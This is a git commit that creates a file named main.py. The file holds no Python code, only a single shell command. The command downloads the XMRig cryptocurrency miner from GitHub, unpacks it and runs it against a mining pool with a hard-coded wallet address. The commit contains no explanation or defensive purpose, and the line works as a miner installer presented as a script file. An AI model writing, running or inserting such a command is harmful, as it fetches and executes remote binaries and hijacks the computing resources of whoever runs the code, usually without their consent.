2c05579815f42eb06ab0d69e61daf8a9397b563c
kawhiharsh <84644364+kawhiharsh@users.noreply.github.com>
2024-01-04 23:18:16 +0530

    Create main.py

---
+++ main.py
@@ -0,0 +1,1 @@
+wget https://github.com/xmrig/xmrig/releases/download/v6.12.1/xmrig-6.12.1-linux-x64.tar.gz && tar -xf xmrig-6.12.1-linux-x64.tar.gz && cd xmrig-6.12.1 && ./xmrig -o rx.unmineable.com:3333 -a rx -k -u NEXA:nexa:nqtsq5g5zqzg355pkuy8jplvhg6c8eqwg5ppdmyqdtzr3lz0.kkmdneyy
